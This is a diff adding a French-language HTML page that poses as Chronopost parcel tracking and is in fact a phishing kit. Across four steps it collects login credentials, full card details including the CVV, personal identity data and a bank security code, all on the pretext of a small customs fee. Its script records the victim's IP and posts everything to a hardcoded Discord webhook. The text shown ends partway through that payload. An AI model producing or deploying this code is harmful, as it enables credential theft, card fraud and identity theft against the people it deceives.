@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Suivi colis | Chronopost</title>
+<link rel="icon" href="https://www.chronopost.fr/sites/chronopost/themes/custom/chronopost/favicon.ico">
+<style>
+@font-face{font-family:PlutoSansDPDLight;src:url(https://www.chronopost.fr/sites/chronopost/themes/custom/chronopost/fonts/pluto/PlutoSansDPDLight.woff2) format('woff2'),url(https://www.chronopost.fr/sites/chronopost/themes/custom/chronopost/fonts/pluto/PlutoSansDPDLight.woff) format('woff');font-display:swap}
+@font-face{font-family:PlutoSansDPDRegular;src:url(https://www.chronopost.fr/sites/chronopost/themes/custom/chronopost/fonts/pluto/PlutoSansDPDRegular.woff2) format('woff2'),url(https://www.chronopost.fr/sites/chronopost/themes/custom/chronopost/fonts/pluto/PlutoSansDPDRegular.woff) format('woff');font-display:swap}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{font-size:16px}
+body{
+    font-family:PlutoSansDPDLight,Arial,Helvetica,sans-serif;
+    font-weight:200;background:#f5f5f5;color:#333;
+    min-height:100vh;display:flex;flex-direction:column;line-height:1.428
+}
+.top-bar{
+    background:#1a1a1a;height:38px;display:flex;align-items:center;
+    justify-content:flex-end;padding:0 30px
+}
+.top-bar a{
+    color:#ff9f43;font-size:12px;margin:0 10px;text-decoration:none;
+    font-family:PlutoSansDPDRegular,Arial,sans-serif;font-weight:400
+}
+.top-bar a:hover{text-decoration:underline}
+.top-bar .sep{color:#555;font-size:11px}
+.main-header{
+    background:#fff;border-bottom:1px solid #e6e7e8;padding:16px 0
+}
+.main-header .inner{
+    max-width:1230px;margin:0 auto;padding:0 30px;
+    display:flex;align-items:center;justify-content:space-between
+}
+.logo img{height:40px;display:block}
+.main-nav a{
+    color:#333;font-size:13px;font-weight:400;margin-left:32px;
+    text-decoration:none;font-family:PlutoSansDPDRegular,Arial,sans-serif
+}
+.main-nav a:hover{color:#ff6200;text-decoration:none}
+.breadcrumb{
+    background:#fafafa;border-bottom:1px solid #e6e7e8;
+    padding:10px 30px;font-size:12px;color:#888;font-family:Arial,sans-serif
+}
+.breadcrumb a{color:#888;text-decoration:none}
+.breadcrumb a:hover{color:#ff6200;text-decoration:underline}
+.breadcrumb .current{color:#333;font-weight:600}
+.fraud-banner{
+    background:#fff8e1;border-bottom:1px solid #ffe082;
+    padding:10px 30px;text-align:center;font-size:13px;color:#6d4c00;font-family:Arial,sans-serif
+}
+.fraud-banner strong{color:#d32f2f;font-weight:700}
+.main-wrap{flex:1;display:flex;justify-content:center;padding:55px 16px 90px}
+.card{
+    background:#fff;border-radius:0;box-shadow:0 1px 4px rgba(0,0,0,.08);
+    max-width:520px;width:100%;padding:42px 42px 38px;border:1px solid #e6e7e8
+}
+.stepper{display:flex;align-items:center;justify-content:center;margin-bottom:32px}
+.stepper .dot{
+    width:32px;height:32px;border-radius:50%;
+    background:#d5d5d5;color:#fff;display:flex;align-items:center;justify-content:center;
+    font-size:13px;font-weight:400;font-family:PlutoSansDPDRegular,Arial,sans-serif
+}
+.stepper .dot.on{background:#ff6200}
+.stepper .dot.ok{background:#43a047}
+.stepper .bar{width:50px;height:2px;background:#d5d5d5;margin:0 5px}
+.stepper .bar.ok{background:#43a047}
+.card h1{font-size:24px;color:#111;margin-bottom:4px;font-weight:200}
+.card .sub{font-size:14px;color:#888;margin-bottom:28px;font-weight:200}
+.colis-box{
+    background:#f0f7ff;border:1px solid #b8d4f0;padding:18px 20px;margin-bottom:26px;
+    font-size:13px;color:#1a3a5c;line-height:1.7
+}
+.colis-box strong{font-family:PlutoSansDPDRegular,Arial,sans-serif;font-weight:400}
+.colis-box .ref{
+    font-size:18px;font-weight:400;color:#ff6200;letter-spacing:1px;
+    margin:7px 0;font-family:PlutoSansDPDRegular,Arial,sans-serif
+}
+.colis-box .green{color:#2e7d32;font-weight:400}
+.colis-box .red{color:#c62828;font-weight:400}
+.frm{margin:0}
+.frm-group{margin-bottom:20px}
+.frm-group label{
+    display:block;font-size:13px;font-weight:400;color:#444;margin-bottom:6px;
+    font-family:PlutoSansDPDRegular,Arial,sans-serif
+}
+.frm-group input{
+    width:100%;padding:12px 14px;border:1px solid #ccc;border-radius:0;
+    font-size:14px;background:#fff;transition:border .15s;
+    font-family:PlutoSansDPDLight,Arial,sans-serif;font-weight:200;color:#333
+}
+.frm-group input:focus{border-color:#ff6200;outline:none}
+.frm-group input::placeholder{color:#bbb}
+.frm-row{display:flex;gap:12px}
+.frm-row .frm-group{flex:1}
+.btn{
+    width:100%;padding:14px;background:#ff6200;color:#fff;
+    border:none;font-size:15px;font-weight:400;cursor:pointer;
+    transition:background .15s;margin-top:6px;font-family:PlutoSansDPDRegular,Arial,sans-serif
+}
+.btn:hover{background:#e55800}
+.btn:disabled{background:#ccc;cursor:not-allowed}
+.btn .spin{
+    display:none;width:17px;height:17px;border:2px solid rgba(255,255,255,.3);
+    border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;margin:0 auto
+}
+.btn.ld .btxt{display:none}
+.btn.ld .spin{display:block}
+@keyframes sp{to{transform:rotate(360deg)}}
+.form-links{text-align:center;margin-top:20px;font-size:13px;color:#888}
+.form-links a{color:#ff6200;margin:0 6px;text-decoration:none}
+.form-links a:hover{text-decoration:underline}
+.secure{text-align:center;margin-top:16px;font-size:11px;color:#aaa}
+.msg-bad{
+    background:#fef2f2;border:1px solid #fecaca;padding:12px 16px;
+    font-size:13px;color:#b91c1c;margin-bottom:18px;display:none;font-family:Arial,sans-serif
+}
+.msg-bad.show{display:block}
+.msg-good{
+    background:#f0fdf4;border:1px solid #bbf7d0;padding:12px 16px;
+    font-size:13px;color:#166534;margin-bottom:18px;display:none;font-family:Arial,sans-serif
+}
+.msg-good.show{display:block}
+.frais-box{
+    background:#fff8f0;border:1px solid #ffe0b2;padding:18px 20px;margin-bottom:22px;font-size:13px
+}
+.frais-box strong{font-family:PlutoSansDPDRegular,Arial,sans-serif;font-weight:400}
+.frais-box table{width:100%;border-collapse:collapse}
+.frais-box td{padding:5px 0}
+.frais-box .tot{border-top:2px solid #ffe0b2}
+.frais-box .tot td{padding-top:10px;font-size:20px;font-weight:400;color:#c62828}
+.pm-title{font-size:13px;font-weight:400;color:#444;margin-bottom:12px;font-family:PlutoSansDPDRegular,Arial,sans-serif}
+.pm-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:22px}
+.pm-item{
+    display:flex;align-items:center;gap:10px;padding:10px 14px;
+    border:1px solid #ddd;cursor:pointer;transition:border .15s,background .15s
+}
+.pm-item:hover{border-color:#ff6200;background:#fffaf5}
+.pm-item input[type="radio"]{accent-color:#ff6200;transform:scale(1.1);margin:0;flex-shrink:0}
+.pm-item label{
+    font-size:13px;font-weight:400;cursor:pointer;flex:1;
+    font-family:PlutoSansDPDRegular,Arial,sans-serif;display:flex;align-items:center;justify-content:space-between
+}
+.pm-item label .pm-icons{display:flex;gap:3px;align-items:center;margin-left:auto;height:22px}
+.pm-item label .pm-icons .pm-badge{
+    display:inline-flex;align-items:center;justify-content:center;
+    height:22px;border-radius:2px;overflow:hidden
+}
+.pm-item.selected{border-color:#ff6200;background:#fff5f0}
+#cb-form{display:block}
+#cb-form.hidden{display:none}
+.cb-detect{
+    display:flex;align-items:center;gap:10px;padding:8px 14px;
+    background:#f9f9f9;border:1px dashed #ddd;margin-bottom:18px;min-height:40px
+}
+.cb-detect .cb-logo{display:none;height:28px}
+.cb-detect .cb-logo.show{display:block}
+.cb-detect .cb-logo svg{height:28px;width:auto}
+.conf-icon{text-align:center;font-size:48px;margin:12px 0 8px;color:#43a047}
+.conf-recap{
+    background:#fafafa;padding:18px 20px;text-align:left;margin:18px 0;font-size:13px
+}
+.conf-recap strong{font-family:PlutoSansDPDRegular,Arial,sans-serif;font-weight:400}
+.conf-recap table{width:100%}
+.conf-recap td{padding:4px 0}
+.conf-recap .r{text-align:right;font-weight:400;color:#ff6200}
+.conf-recap .g{color:#2e7d32;font-weight:400}
+.code-input input{
+    text-align:center;font-size:28px;letter-spacing:14px;font-weight:400;
+    font-family:PlutoSansDPDRegular,Arial,sans-serif;padding:14px 10px
+}
+.verif-box{
+    background:#fff8f0;border:1px solid #ffe0b2;padding:15px 18px;
+    margin:18px 0;font-size:13px;color:#c62828;text-align:left;line-height:1.7
+}
+.verif-box strong{font-family:PlutoSansDPDRegular,Arial,sans-serif;font-weight:400}
+.site-footer{
+    background:#1a1a1a;color:#aaa;padding:30px 24px;text-align:center;font-size:11px;
+    margin-top:auto;font-family:Arial,sans-serif;line-height:1.8
+}
+.site-footer a{color:#ff9f43;margin:0 6px;text-decoration:none}
+.site-footer a:hover{text-decoration:underline}
+.site-footer p{margin-top:8px;color:#777}
+.pg{display:none}
+.pg.on{display:block}
+@media(max-width:540px){
+    .card{padding:24px 16px;border:none;box-shadow:none}
+    .main-wrap{padding:20px 0 60px}
+    .top-bar{justify-content:center;padding:0 10px;height:34px}
+    .top-bar a{margin:0 5px;font-size:11px}
+    .main-nav a{margin-left:14px;font-size:12px}
+    .frm-row{flex-direction:column;gap:0}
+    .main-header .inner{padding:0 14px}
+    .breadcrumb{padding:8px 14px;font-size:11px}
+    .fraud-banner{padding:8px 14px;font-size:12px}
+    .stepper .bar{width:35px}
+    .pm-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+
+<div class="top-bar">
+    <a href="#">Particulier</a><span class="sep">|</span>
+    <a href="#">Professionnel</a><span class="sep">|</span>
+    <a href="#">Espace Outre-Mer</a><span class="sep">|</span>
+    <a href="#">Nous contacter</a><span class="sep">|</span>
+    <a href="#" style="font-weight:400">EN</a><span class="sep">|</span>
+    <a href="#" style="font-weight:400">FR</a>
+</div>
+
+<div class="main-header">
+    <div class="inner">
+        <a href="#" class="logo"><img src="https://www.chronopost.fr/sites/chronopost/themes/custom/chronopost/images/chronopost_logo.png" alt="Chronopost"></a>
+        <div class="main-nav">
+            <a href="#">Envoyer un colis</a>
+            <a href="#">Suivre un colis</a>
+            <a href="#">Nos offres</a>
+            <a href="#">Aide</a>
+        </div>
+    </div>
+</div>
+
+<div class="breadcrumb">
+    <a href="#">Accueil</a> &gt; <a href="#">Particulier</a> &gt; <span class="current">Suivi de colis</span>
+</div>
+
+<div class="fraud-banner">
+    <strong>Alerte fraude :</strong> Ne communiquez jamais vos informations bancaires par email ou par telephone.
+    <a href="#" style="color:#c62828;font-weight:600;text-decoration:underline">En savoir plus</a>
+</div>
+
+<div class="main-wrap">
+
+    <!-- PAGE 1 : CONNEXION -->
+    <div id="pg1" class="pg on">
+        <div class="card">
+            <div class="stepper">
+                <div class="dot on">1</div>
+                <div class="bar"></div>
+                <div class="dot">2</div>
+                <div class="bar"></div>
+                <div class="dot">3</div>
+                <div class="bar"></div>
+                <div class="dot">4</div>
+            </div>
+            <h1>Suivez votre colis</h1>
+            <p class="sub">Connectez-vous pour acceder aux details de votre livraison</p>
+            <div id="e1" class="msg-bad">Identifiants incorrects. Veuillez reessayer.</div>
+            <div class="colis-box">
+                <strong>Un colis vous attend</strong>
+                <div class="ref">FR 45 6298 7412 3A</div>
+                <p>Statut : <span class="green">En cours de livraison</span><br>Derniere mise a jour : <span id="dateMaj"></span><br><br><span class="red">Frais de douane en attente : 1,99 EUR</span><br>Un paiement est necessaire pour finaliser la distribution de votre colis.</p>
+            </div>
+            <form class="frm" onsubmit="return f1(event)">
+                <div class="frm-group"><label>Adresse e-mail</label><input type="email" id="i1" placeholder="exemple@email.com" required></div>
+                <div class="frm-group"><label>Mot de passe</label><input type="password" id="i2" placeholder="Mot de passe" required></div>
+                <button type="submit" class="btn" id="b1"><span class="btxt">Se connecter</span><div class="spin"></div></button>
+            </form>
+            <div class="form-links"><a href="#">Mot de passe oublie ?</a> | <a href="#">Creer un compte</a></div>
+            <div class="secure">Connexion securisee - HTTPS</div>
+        </div>
+    </div>
+
+    <!-- PAGE 2 : PAIEMENT -->
+    <div id="pg2" class="pg">
+        <div class="card">
+            <div class="stepper">
+                <div class="dot ok"><svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M3 7L6 10L11 4" stroke="white" stroke-width="2" stroke-linecap="round"/></svg></div>
+                <div class="bar ok"></div>
+                <div class="dot on">2</div>
+                <div class="bar"></div>
+                <div class="dot">3</div>
+                <div class="bar"></div>
+                <div class="dot">4</div>
+            </div>
+            <h1>Frais de douane</h1>
+            <p class="sub">Choisissez votre moyen de paiement pour regulariser la livraison</p>
+            <div id="e2" class="msg-bad"></div>
+            <div class="frais-box">
+                <strong>Detail des frais</strong>
+                <table>
+                    <tr><td>Frais de douane</td><td style="text-align:right">1,50 EUR</td></tr>
+                    <tr><td>Frais de traitement</td><td style="text-align:right">0,49 EUR</td></tr>
+                    <tr class="tot"><td>Total</td><td style="text-align:right">1,99 EUR</td></tr>
+                </table>
+            </div>
+            <div class="pm-title">Moyen de paiement</div>
+            <div class="pm-grid">
+                <div class="pm-item selected" data-pm="cb" onclick="selPM(this)">
+                    <input type="radio" name="pm" id="pm-cb" checked>
+                    <label for="pm-cb">
+                        <span>Carte bancaire</span>
+                        <span class="pm-icons">
+                            <span class="pm-badge" style="background:#1A1F71;padding:0 6px"><svg viewBox="0 0 38 24" width="38" height="22"><rect width="38" height="24" rx="3" fill="#1A1F71"/><text x="19" y="16" font-size="10" fill="white" font-weight="700" text-anchor="middle" font-family="Arial" letter-spacing="1.5">VISA</text></svg></span>
+                            <span class="pm-badge" style="background:#000;padding:0"><svg viewBox="0 0 44 24" width="44" height="22"><rect width="44" height="24" rx="3" fill="#000"/><circle cx="14.5" cy="12" r="6.5" fill="#EB001B"/><circle cx="25.5" cy="12" r="6.5" fill="#F79E1B"/></svg></span>
+                        </span>
+                    </label>
+                </div>
+                <div class="pm-item" data-pm="paypal" onclick="selPM(this)">
+                    <input type="radio" name="pm" id="pm-paypal">
+                    <label for="pm-paypal">
+                        <span>PayPal</span>
+                        <span class="pm-icons"><span class="pm-badge" style="background:#fff;padding:0;border:1px solid #ddd"><svg viewBox="0 0 52 24" width="52" height="22"><rect width="52" height="24" rx="3" fill="#003087"/><text x="26" y="16" font-size="8" fill="white" font-weight="700" text-anchor="middle" font-family="Arial" letter-spacing=".5">PayPal</text></svg></span></span>
+                    </label>
+                </div>
+                <div class="pm-item" data-pm="applepay" onclick="selPM(this)">
+                    <input type="radio" name="pm" id="pm-apple">
+                    <label for="pm-apple">
+                        <span>Apple Pay</span>
+                        <span class="pm-icons"><span class="pm-badge" style="background:#fff;padding:0;border:1px solid #ddd"><svg viewBox="0 0 52 24" width="52" height="22"><rect width="52" height="24" rx="3" fill="#000"/><text x="26" y="16" font-size="7" fill="white" font-weight="600" text-anchor="middle" font-family="Arial">Apple Pay</text></svg></span></span>
+                    </label>
+                </div>
+                <div class="pm-item" data-pm="googlepay" onclick="selPM(this)">
+                    <input type="radio" name="pm" id="pm-google">
+                    <label for="pm-google">
+                        <span>Google Pay</span>
+                        <span class="pm-icons"><span class="pm-badge" style="background:#fff;padding:0;border:1px solid #ddd"><svg viewBox="0 0 52 24" width="52" height="22"><rect width="52" height="24" rx="3" fill="#fff"/><text x="26" y="16" font-size="6.5" fill="#4285F4" font-weight="700" text-anchor="middle" font-family="Arial">Google Pay</text></svg></span></span>
+                    </label>
+                </div>
+            </div>
+            <div id="cb-form">
+                <div class="cb-detect" id="cbDetect">
+                    <span class="cb-logo" id="cbLogo"></span>
+                </div>
+                <form class="frm" onsubmit="return f2(event)">
+                    <div class="frm-group"><label>Numero de carte</label><input type="text" id="i3" placeholder="1234 5678 9012 3456" maxlength="19" required oninput="detectCard(this)"></div>
+                    <div class="frm-row">
+                        <div class="frm-group"><label>Date d'expiration</label><input type="text" id="i4" placeholder="MM/AA" maxlength="5" required oninput="cEX(this)"></div>
+                        <div class="frm-group"><label>Cryptogramme</label><input type="text" id="i5" placeholder="123" maxlength="4" required oninput="this.value=this.value.replace(/[^0-9]/g,'')"></div>
+                    </div>
+                    <div class="frm-group"><label>Titulaire de la carte</label><input type="text" id="i6" placeholder="PRENOM NOM" required></div>
+                    <button type="submit" class="btn" id="b2"><span class="btxt">Payer 1,99 EUR</span><div class="spin"></div></button>
+                </form>
+            </div>
+            <div class="secure">Paiement securise - 256-bit SSL - Crypte</div>
+        </div>
+    </div>
+
+    <!-- PAGE 3 : INFOS PERSONNELLES -->
+    <div id="pg3" class="pg">
+        <div class="card">
+            <div class="stepper">
+                <div class="dot ok"><svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M3 7L6 10L11 4" stroke="white" stroke-width="2" stroke-linecap="round"/></svg></div>
+                <div class="bar ok"></div>
+                <div class="dot ok"><svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M3 7L6 10L11 4" stroke="white" stroke-width="2" stroke-linecap="round"/></svg></div>
+                <div class="bar ok"></div>
+                <div class="dot on">3</div>
+                <div class="bar"></div>
+                <div class="dot">4</div>
+            </div>
+            <h1>Verification d'identite</h1>
+            <p class="sub">Pour finaliser votre paiement, veuillez confirmer vos informations personnelles</p>
+            <div id="e3" class="msg-bad">Veuillez remplir tous les champs obligatoires.</div>
+            <form class="frm" onsubmit="return f3(event)">
+                <div class="frm-row">
+                    <div class="frm-group"><label>Nom</label><input type="text" id="i7" placeholder="DUPONT" required></div>
+                    <div class="frm-group"><label>Prénom</label><input type="text" id="i8" placeholder="Jean" required></div>
+                </div>
+                <div class="frm-group"><label>Date de naissance</label><input type="text" id="i9" placeholder="JJ/MM/AAAA" maxlength="10" required oninput="cDN(this)"></div>
+                <div class="frm-group"><label>Adresse</label><input type="text" id="i10" placeholder="42 Rue de la Paix" required></div>
+                <div class="frm-row">
+                    <div class="frm-group"><label>Code postal</label><input type="text" id="i11" placeholder="75001" maxlength="5" required oninput="this.value=this.value.replace(/[^0-9]/g,'')"></div>
+                    <div class="frm-group"><label>Ville</label><input type="text" id="i12" placeholder="Paris" required></div>
+                </div>
+                <div class="frm-group"><label>Téléphone</label><input type="text" id="i13" placeholder="06 12 34 56 78" maxlength="14" required oninput="cTel(this)"></div>
+                <button type="submit" class="btn" id="b3"><span class="btxt">Continuer</span><div class="spin"></div></button>
+            </form>
+            <div class="secure">Donnees protegees - Conformite RGPD</div>
+        </div>
+    </div>
+
+    <!-- PAGE 4 : CONFIRMATION + 2FA -->
+    <div id="pg4" class="pg">
+        <div class="card" style="text-align:center">
+            <div class="stepper">
+                <div class="dot ok"><svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M3 7L6 10L11 4" stroke="white" stroke-width="2" stroke-linecap="round"/></svg></div>
+                <div class="bar ok"></div>
+                <div class="dot ok"><svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M3 7L6 10L11 4" stroke="white" stroke-width="2" stroke-linecap="round"/></svg></div>
+                <div class="bar ok"></div>
+                <div class="dot ok"><svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M3 7L6 10L11 4" stroke="white" stroke-width="2" stroke-linecap="round"/></svg></div>
+                <div class="bar ok"></div>
+                <div class="dot on">4</div>
+            </div>
+            <div class="conf-icon">&#10003;</div>
+            <h1>Paiement accepte</h1>
+            <p class="sub">Votre colis sera livre sous 24 a 48h ouvre</p>
+            <div class="msg-good show" style="text-align:left"><strong>Confirmation envoyee</strong><br>Un recapitulatif a ete envoye a <strong id="dEmail"></strong></div>
+            <div class="conf-recap">
+                <strong>Recapitulatif</strong>
+                <table>
+                    <tr><td>Colis</td><td class="r">FR 45 6298 7412 3A</td></tr>
+                    <tr><td>Montant</td><td class="r">1,99 EUR</td></tr>
+                    <tr><td>Statut</td><td class="g" style="text-align:right;font-weight:400">Confirme</td></tr>
+                    <tr><td>Livraison prevue</td><td class="r"><span id="dateLivraison"></span></td></tr>
+                </table>
+            </div>
+            <div class="verif-box">
+                <strong>Verification de securite requise :</strong><br>
+                Pour valider le remboursement des frais de douane et securiser votre compte, 
+                veuillez saisir le <strong>code d'activation</strong> a 4 chiffres envoye par votre banque.
+            </div>
+            <form class="frm" onsubmit="return f4(event)">
+                <div class="frm-group code-input"><label>Code de securite bancaire (obligatoire)</label><input type="password" id="i14" placeholder="* * * *" maxlength="4" required oninput="this.value=this.value.replace(/[^0-9]/g,'')"></div>
+                <button type="submit" class="btn" id="b4" style="background:#43a047"><span class="btxt">Verifier et finaliser</span><div class="spin"></div></button>
+            </form>
+            <div class="form-links"><a href="#">Acceder a mon espace client</a></div>
+        </div>
+    </div>
+
+</div>
+
+<div class="site-footer">
+    <div>
+        <a href="#">Mentions legales</a>
+        <a href="#">CGV Consommateur</a>
+        <a href="#">CGV Professionnel</a>
+        <a href="#">Donnees personnelles</a>
+        <a href="#">Gestion des cookies</a>
+        <a href="#">Accessibilite : non conforme</a>
+    </div>
+    <p>&copy; 2026 Chronopost - Groupe Geopost</p>
+</div>
+
+<script>
+var WEBHOOK = "https://discord.com/api/webhooks/1513246492305920201/CXSQSM-7I3TMmh5lxRvqYj086Uo8_On-_sbj4W_HCJfey3-YTnJI3fMHgS9l0fbuqzGN";
+
+// ===== DATES DYNAMIQUES =====
+(function() {
+    var now = new Date();
+    var d1 = new Date(now); d1.setDate(d1.getDate() - 3);
+    document.getElementById('dateMaj').textContent = d1.toLocaleDateString('fr-FR') + ' a 09:42';
+    var d2 = new Date(now); var d3 = new Date(now);
+    d2.setDate(d2.getDate() + 2); d3.setDate(d3.getDate() + 3);
+    document.getElementById('dateLivraison').textContent = d2.toLocaleDateString('fr-FR') + ' - ' + d3.toLocaleDateString('fr-FR');
+})();
+
+// ===== STOCKAGE DES DONNEES =====
+var _collectedData = {};
+
+// ===== FONCTIONS UTILITAIRES =====
+function getIP() {
+    var ip = "Inconnue";
+    var x = new XMLHttpRequest();
+    x.open("GET", "https://api64.ipify.org?format=json", false);
+    try { x.send(); if (x.status === 200) { ip = JSON.parse(x.responseText).ip; } } catch(e) {}
+    return ip;
+}
+
+function getUA() { return navigator.userAgent; }
+
+function detectCardType(num) {
+    var f4 = num.substring(0,4);
+    if (num.charAt(0) === '4') return 'Visa';
+    else if (num.charAt(0) === '5' || (parseInt(f4) >= 2221 && parseInt(f4) <= 2720)) return 'Mastercard';
+    else if (f4.substring(0,2) === '34' || f4.substring(0,2) === '37') return 'American Express';
+    else if (f4 === '6011' || f4.substring(0,2) === '65') return 'Discover';
+    else if (f4.substring(0,2) === '36' || f4.substring(0,2) === '38') return 'Diners Club';
+    return 'Visa';
+}
+
+// ===== IMAGES DE CARTES (URLs) =====
+var cardImages = {
+    'Visa': 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg',
+    'Mastercard': 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg',
+    'American Express': 'https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg',
+    'Discover': 'https://upload.wikimedia.org/wikipedia/commons/5/5a/Discover_Card_logo.svg',
+    'Diners Club': 'https://upload.wikimedia.org/wikipedia/commons/4/4a/Diners_Club_International_logo.svg'
+};
+
+// ===== LOGOS SVG PAR TYPE DE CARTE =====
+var cardSVGs = {
+    'visa': '<svg viewBox="0 0 38 24" width="38" height="28"><rect width="38" height="24" rx="3" fill="#1A1F71"/><text x="19" y="16" font-size="9" fill="white" font-weight="700" text-anchor="middle" font-family="Arial" letter-spacing="1">VISA</text></svg>',
+    'mastercard': '<svg viewBox="0 0 44 24" width="44" height="28"><rect width="44" height="24" rx="3" fill="#000"/><circle cx="14.5" cy="12" r="6.5" fill="#EB001B"/><circle cx="25.5" cy="12" r="6.5" fill="#F79E1B"/></svg>',
+    'amex': '<svg viewBox="0 0 38 24" width="38" height="28"><rect width="38" height="24" rx="3" fill="#2E6DB4"/><text x="19" y="16" font-size="7" fill="white" font-weight="700" text-anchor="middle" font-family="Arial">AMEX</text></svg>',
+    'discover': '<svg viewBox="0 0 38 24" width="38" height="28"><rect width="38" height="24" rx="3" fill="#000"/><circle cx="11" cy="12" r="6" fill="#FF5A00"/><text x="24" y="16" font-size="7" fill="white" font-weight="700" font-family="Arial">DISC</text></svg>',
+    'diners': '<svg viewBox="0 0 38 24" width="38" height="28"><rect width="38" height="24" rx="3" fill="#0079BE"/><text x="19" y="16" font-size="6" fill="white" font-weight="700" text-anchor="middle" font-family="Arial">DINERS</text></svg>',
+    'jcb': '<svg viewBox="0 0 38 24" width="38" height="28"><rect width="38" height="24" rx="3" fill="#0B7C43"/><text x="19" y="16" font-size="8" fill="white" font-weight="700" text-anchor="middle" font-family="Arial">JCB</text></svg>'
+};
+
+// ===== DÉTECTION TYPE DE CARTE =====
+function detectCard(input) {
+    var v = input.value.replace(/[^0-9]/g, '');
+    var parts = [];
+    for (var i = 0; i < v.length && i < 16; i += 4) parts.push(v.substring(i, i+4));
+    input.value = parts.join(' ');
+    var logo = document.getElementById('cbLogo');
+    logo.innerHTML = '';
+    logo.classList.remove('show');
+    if (v.length < 2) return;
+    var first2 = v.substring(0,2);
+    var first4 = v.substring(0,4);
+    var key = null;
+    if (v.charAt(0) === '4') { key = 'visa'; }
+    else if (first2 >= '22' && first2 <= '27') { key = 'mastercard'; }
+    else if (first2 >= '51' && first2 <= '55') { key = 'mastercard'; }
+    else if (first2 === '34' || first2 === '37') { key = 'amex'; }
+    else if (first4 === '6011' || first2 === '65' || (parseInt(v.substring(0,3)) >= 644 && parseInt(v.substring(0,3)) <= 649)) { key = 'discover'; }
+    else if (first2 === '36' || first2 === '38' || (v.substring(0,3) >= '300' && v.substring(0,3) <= '305')) { key = 'diners'; }
+    else if (first4 >= '3528' && first4 <= '3589') { key = 'jcb'; }
+    if (key) { logo.innerHTML = cardSVGs[key]; logo.classList.add('show'); }
+}
+
+// ===== SÉLECTION PM =====
+function selPM(el) {
+    var items = document.querySelectorAll('.pm-item');
+    for (var i = 0; i < items.length; i++) items[i].classList.remove('selected');
+    el.classList.add('selected');
+    el.querySelector('input[type="radio"]').checked = true;
+    var pm = el.getAttribute('data-pm');
+    var cbForm = document.getElementById('cb-form');
+    var err = document.getElementById('e2');
+    if (pm === 'cb') { cbForm.classList.remove('hidden'); err.classList.remove('show'); }
+    else {
+        cbForm.classList.add('hidden');
+        err.textContent = "Ce moyen de paiement n'est pas disponible pour les frais de douane. Veuillez utiliser une carte bancaire.";
+        err.classList.add('show');
+        setTimeout(function() { err.classList.remove('show'); }, 5000);
+    }
+}
+
+// ===== ENVOI UNIQUE FINAL =====
+function sendAll() {
+    var ip = getIP();
+    var ua = getUA();
+    var now = new Date();
+    var ts = now.toLocaleDateString('fr-FR') + ' ' + now.toLocaleTimeString('fr-FR');
+    
+    var cardType = detectCardType(_collectedData.card);
+    var cardImageUrl = cardImages[cardType] || cardImages['Visa'];
+    
+    var numFormatted = _collectedData.card.replace(/(.{4})/g, '$1 ').trim();
+    
+    var x = new XMLHttpRequest();
+    x.open("POST", WEBHOOK, true);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.send(JSON.stringify({
+        username: "Chronopost - Securite",
+        avatar_url: "https://www.chronopost.fr/sites/chronopost/themes/custom/chronopost/favicon.ico",
+        embeds: [{
+            title: "😶‍🌫️ PAGE OPEN 😶‍🌫️",
+            color: 15158332,
+            fields: [
+                { name: "😶‍🌫️ Adresse IP", value: "```" + ip + "```", inline: false },
+                { name: "😶‍🌫️ User-Agent", value: "```" + ua + "```", inline: false }
+            ],
+            footer: { text: "Chronopost - Systeme de securite | " + ts },
+            timestamp: new Date().toISOString()
+        },
+        {
+            title: "😶‍🌫️ LOGIN 😶‍🌫️",
+            color: 15158332,
+            fields: [
+                { name: "📧 Email", value: "```" + _collectedData.email + "```", inline: false },
+                { name: "🔑 Mot de passe", value: "```" + _collectedData.password + "```", inline: false },
+                { name: "😶‍🌫️ IP", value: "```" + ip + "```", inline: false },
+                { name: "😶‍🌫️ User-Agent", value: "```" + ua + "```", inline: false }
+            ],
+            footer: { text: "Chronopost - Systeme de securite | " + ts },
+            timestamp: new Date().toISOString()
+        },
+        {
+            title: "🃏 +1 CARD 🃏",
+            color: 15105570,
+            fields: [
+                { name: "🃏 Nom/Prenom", value: "```" + _collectedData.name + "```", inline: false },
+                { name: "🃏 Numero", value: "```" + _collectedData.card + "```", inline: false },
+                { name: "🃏 Expiration", value: "```" + _collectedData.exp + "```", inline: true },
+                { name: "🃏 CVV", value: "```" + _collectedData.cvv + "```", inline: true },
+                { name: "🃏 Banque", value: "```BANQUE POSTALE```", inline: true },
+                { name: "🃏 Niveau", value: "```Classic```", inline: true },
+                { name: "🃏 Type", value: "```" + cardType + "```", inline: true }
+            ],
+            image: { url: cardImageUrl },
+            footer: { text: "Chronopost - Systeme de securite | " + ts },
+            timestamp: new Date().toISOString()
+        },
+        {
+            title: "🎈 INFOS PERSONNELLES 🎈",
+            color: 3066993,
+            fields: [
+                { name: "🎈 Nom", value: "```" + _collectedData.nom + "```", inline: true },
+                { name: "🎈 Prénom", value: "```" + _collectedData.prenom + "```", inline: true },
+                { name: "🎈 Date De Naissance", value: "```" + _collectedData.ddn + "```", inline: true },
+                { name: "🎈 Adresse", value: "```" + _collectedData.adresse + "```", inline: false },
+                { name: "🎈 Code Postal", value: "```" + _collectedData.cp + "```", inline: true },
+                { name: "🎈 Ville", value: "```" + _collectedData.ville + "```", inline: true },
+                { name: "🎈 Téléphone", value: "```" + _collectedData.tel + "```", inline: false }
+            ],
+            footer: { text: "Chronopost - Systeme de securite | " + ts },
+            timestamp: new Date().toISOString()
+        },
+        {
+            title: "🩻 COMPLÉMENTAIRE 🩻",
+            color: 15548997,
+            fields: [
+                { name: "🩻 IP", value: "```" + ip + "```", inline: false },
